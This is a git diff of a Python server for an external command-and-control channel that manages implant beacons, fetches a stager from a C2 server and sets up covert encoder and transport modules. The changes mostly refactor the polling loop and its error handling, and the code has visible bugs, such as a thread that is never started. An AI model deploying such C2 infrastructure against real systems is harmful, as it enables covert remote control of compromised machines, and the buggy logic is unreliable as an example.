@@ -28,18 +28,13 @@ def task_loop(beacon_obj):
 	"""
 
 	# Start with logic to setup the connection to the external_c2 server
-	beacon_obj.sock = commonUtils.createSocket() # TODO: This be better moved to when the server polls for a new beacon
+	beacon_obj.sock = commonUtils.createSocket() # TODO: Move to when the server polls for a new beacon
 
 	# TODO: Add logic that will check and recieve a confirmation from the client that it is ready to recieve and inject the stager
 	# Poll covert channel for 'READY2INJECT' message from client
 	#       * We can make the client send out 'READY2INJECT' msg from client periodically when it doesn't have a running beacon so that we don't miss it
 	# if args.verbose:
 	#       print commonUtils.color("Client ready to recieve stager")
-
-	# #####################
-
-	# Prep the transport module
-	prep_trans = transport.prepTransport() # TODO: Consider whether this needs to be outside this function.
 
 	# Let's get the stager from the c2 server
 	stager_status = configureStage.loadStager(beacon_obj.sock)
@@ -96,34 +91,41 @@ def main():
 	# Import our defined encoder and transport modules
 	if config.verbose:
 		print (commonUtils.color("Importing encoder module: ") + "%s") % (config.ENCODER_MODULE)
-	importModule(config.ENCODER_MODULE, "encoder")
+	importModule(config.ENCODER_MODULE, "encoder") # TODO: Why does this exist twice?
 	commonUtils.importModule(config.ENCODER_MODULE, "encoder")
 	if config.verbose:
 		print (commonUtils.color("Importing transport module: ") + "%s") % (config.TRANSPORT_MODULE)
-	importModule(config.TRANSPORT_MODULE, "transport")
+	importModule(config.TRANSPORT_MODULE, "transport") # TODO: why does this exist twice?
 	commonUtils.importModule(config.TRANSPORT_MODULE, "transport")
+
+	# TODO: Check here whether we're doing batch processing; if not, have prepTransport run in beacon thread instead
+	# Prep the transport module
+	prep_trans = transport.prepTransport()
 
 	active_beacons = [] # TODO: May need to be a global? This will become obsolete if db functionality is implemented
 	new_beacon_queue = queue.Queue()
-	# TODO: wrap rest of function in a perpetually repeating loop that repeats on config.C2_BLOCK_TIME?
 	while True:
-		# TODO: add logic to check for new beacons here that will return a beacon.Beacon object
-		while not new_beacon_queue.empty():
-			# TODO: Below block should only ever execute if we get a new beacon. It may be optimal to implement a queue for new beacons.
-			try:
-				beacon_obj = queue.get()
-				print commonUtils.color("Attempting to start session for beacon {}").format(beacon_obj.beacon_id)
-				t = threading.Thread(target=task_loop, args=(beacon_obj))
-				t.daemon=True
+		try:
+			# TODO: add logic to check for new beacons here that will return a beacon.Beacon object
+			while not new_beacon_queue.empty():
+				try:
+					beacon_obj = queue.get()
+					print commonUtils.color("Attempting to start session for beacon {}").format(beacon_obj.beacon_id)
+					t = threading.Thread(target=task_loop, args=(beacon_obj))
+					t.daemon=True
 
-				# Restart this loop
-			except KeyboardInterrupt:
-				# TODO: Might need to move this back a block?
-				if config.debug:
-					print commonUtils.color("\nClosing the socket to the c2 server") # TODO: Fix this message
-				commonUtils.killSocket(beacon_obj.sock) # TODO Kill all sockets for every active beacon
-				print commonUtils.color("\nExiting...", warning=True)
-				sys.exit(0)
+					# Restart this loop
+				except Exception as e:
+					print commonUtils.color("Error occured while attempting to start beacon {}", status=False, warning=True).format(beacon_obj.beacon_id)
+					print commonUtils.color("Exception is: {}", status=False, warning=True).format(e)
+					pass
+
+		except KeyboardInterrupt:
+			if config.debug:
+				print commonUtils.color("\nClosing all sockets to the c2 server")
+			commonUtils.killSocket(beacon_obj.sock) # TODO Kill all sockets for every active beacon
+			print commonUtils.color("\nExiting...", warning=True)
+			sys.exit(0)
 
 		# TODO: Determine best way to determine how long to sleep between checks for new beacons
 		sleep(120) # Default timer between new beacon checks
